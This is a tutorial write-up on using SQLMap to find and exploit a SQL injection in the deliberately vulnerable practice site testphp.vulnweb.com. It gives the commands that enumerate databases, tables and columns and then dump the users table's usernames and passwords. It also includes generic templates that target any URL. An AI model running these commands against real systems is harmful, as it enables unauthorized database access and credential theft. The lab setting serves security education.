# **SQLMap Injection: Automating SQL Injection Detection and Exploitation**

<details>
<summary><strong>SQL Injection</strong></summary>
SQL injection is a security vulnerability found in web applications that allow attackers to interfere with the queries that an application makes to its database. It arises when user inputs are unsafely processed and concatenated into SQL queries, enabling attackers to manipulate the intended query structure. Through SQL injection, attackers can execute unauthorized SQL commands, access sensitive data, modify data, or even delete entire databases.When exploited, SQL injection can have severe consequences, compromising the confidentiality, integrity, and availability of data. Attackers can bypass authentication, extract sensitive information such as usernames, passwords, or credit card details, manipulate data, and potentially cause a complete system compromise.
</details>

<details>
<summary><strong>SQLMap</strong></summary>
SQLMap is a powerful open-source penetration testing tool designed to automate the process of detecting and exploiting SQL injection vulnerabilities in web applications. It assists security professionals and ethical hackers in identifying and leveraging SQL injection flaws by automating the process of testing and exploiting potential vulnerabilities. SQLMap is a pre-installed tool in Kali Linux, typically available in the system; if not present, it can be installed using commands:  
  
```bash
sudo apt-get install sqlmap
```
</details>

## Vulnweb Overview

Vulnweb.com hosts intentionally vulnerable web applications that facilitate understanding programming and configuration errors leading to security breaches. It serves as a practical platform for testing security tools like Acunetix or performing manual penetration testing for educational purposes. The site encompasses various applications intentionally designed with vulnerabilities like SQL Injection, Cross-site Scripting (XSS), Cross-site Request Forgery (CSRF), among others.

### Websites under Vulnweb.com
-----------------------------------------------------------------------------------------
| Name           | URL                              | Technologies                      |
|----------------|----------------------------------|-----------------------------------|
| SecurityTweets | http://testhtml5.vulnweb.com     | nginx, Python, Flask, CouchDB     |
| Acuart         | http://testphp.vulnweb.com       | Apache, PHP, MySQL                |
| Acuforum       | http://testasp.vulnweb.com       | IIS, ASP, Microsoft SQL Server    |
| Acublog        | http://testaspnet.vulnweb.com    | IIS, ASP.NET, Microsoft SQL Server| 
| REST API       | http://rest.vulnweb.com/         | Apache, PHP, MySQL                | 
-----------------------------------------------------------------------------------------
### Using Acuart for SQL Injection

Acuart (http://testphp.vulnweb.com) is an intentionally vulnerable web application under Vulnweb.com, utilizing Apache, PHP, and MySQL technologies. So, for SQL injection,this can be use as testing ground.

## 1. SQLMap Basic Parameter 
-------------------------------------------------------------------------------------------------------------------------------
| Parameter    | Description                                                                                                  |
|--------------|--------------------------------------------------------------------------------------------------------------|
| `-u`         | Target URL or web application where the SQL injection attack will be performed.                              |
| `--dbs`      | Command to fetch and display available databases present on the target server.                               |
| `-D`         | Specifies the name of the database to be targeted for enumeration or exploitation.                           |
| `--tables`   | Retrieves and displays the list of tables within a specified database.                                       |
| `-T`         | Specifies the name of the table to perform actions such as data retrieval or exploitation.                   |
| `--columns`  | Fetches and lists the columns available within a specified table.                                            |
| `-C`         | Specifies the column name(s) from which data needs to be retrieved or exploited.                             |
| `--dump`     | Command to extract and display the content of the specified column(s) from a table.                          |
-------------------------------------------------------------------------------------------------------------------------------

- Command to identify databases on the target server
```bash
sqlmap -u http://targetwebsite.com --dbs
```

- Command to enumerate tables in a specific database
```bash
sqlmap -u http://targetwebsite.com -D database_name --tables
```


- Command to list columns in a table
```bash
sqlmap -u http://targetwebsite.com -D database_name -T table_name --columns
```

- Command to extract data from a specific column in a table
```bash
sqlmap -u http://targetwebsite.com -D database_name -T table_name -C column_name --dump
```

## 2. Identifying Vulnerable Parameters
The first step in conducting SQL injection involves identifying vulnerable parameters within a web application.SQL injection vulnerabilities can be discover by testing the URL parameter `php?id=` to test for potential injection points.

```plaintext
site:http://testphp.vulnweb.com/ php?id=
```

When performing a search with the query `site:http://testphp.vulnweb.com/ php?id=` you were directed to a specific page on the website `http://testphp.vulnweb.com`. The URL you encountered was `http://testphp.vulnweb.com/artists.php?artist=1` .

This URL indicates that you were redirected to a page named artists.php on the website. Within the URL, the parameter artist=1 is present. This parameter (artist) is one of the points within the website that is potential vulnerable for SQL injection vulnerabilities.

## 3. SQLMap Database Enumeration
After identifying the potentially vulnerable parameter (artist=1) , proceed to use SQLMap, a tool for automating SQL injection detection and exploitation.The command `sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs` was executed. This command instructs SQLMap to target the URL and perform a database enumeration `--dbs`, seeking to retrieve available database names from the targeted website.The result showed the enumeration of two available databases:

- `acuart`<br>
- `information_schema`<br>

These are the databases detected by SQLMap on the targeted website.

## 4. SQLMap Database Tables Enumeration
Executing the command `sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables` aimed at discovering tables within the ***acuart*** database resulted in the following tables:

-------------
| 8 tables  |
|-----------|
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
-------------

This enumeration identified a total of 8 tables within the ***acuart*** database on the targeted website.

## 5. SQLMap Column Information
Following the database and table enumeration, the SQLMap command `sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns` was executed. This command was intended to gather information about columns within the users table of the acuart database.
The result provided details about the columns present within the users table:


---------------------------
| Column   | Type         |
|----------|--------------|
| name     | varchar(100) |
| address  | mediumtext   |
| cart     | varchar(100) |
| cc       | varchar(100) |
| email    | varchar(100) |
| pass     | varchar(100) |
| phone    | varchar(100) |
| uname    | varchar(100) |
---------------------------

This output signifies the column names and their respective data types within the users table in the ***acuart*** database.


## 6. SQLMap Data Retrieval
The SQLMap commands were employed to extract information from the username and password columns in the ***users*** table.
### Retrieval of Username (**uname**):

```bash
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
```
Upon executing the command to retrieve the ***uname*** column, and the result show that the username stored in the database is `test`.

### Retrieval of Password (**pass**):

``` bash
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass --dump
```
Similarly, when the command targeted the ***pass*** column, it show that password stored in the database is also `test`.

Both the `uname` (username) and `pass` (password) columns retrieved the value `test`, suggesting that these credentials as both username and password By leveraging the SQLMap tool to perform SQL injection on the website, we successfully retrieved the username and password. This indicates that `test` can serve as both the username and password for logging into the website using these credentials.

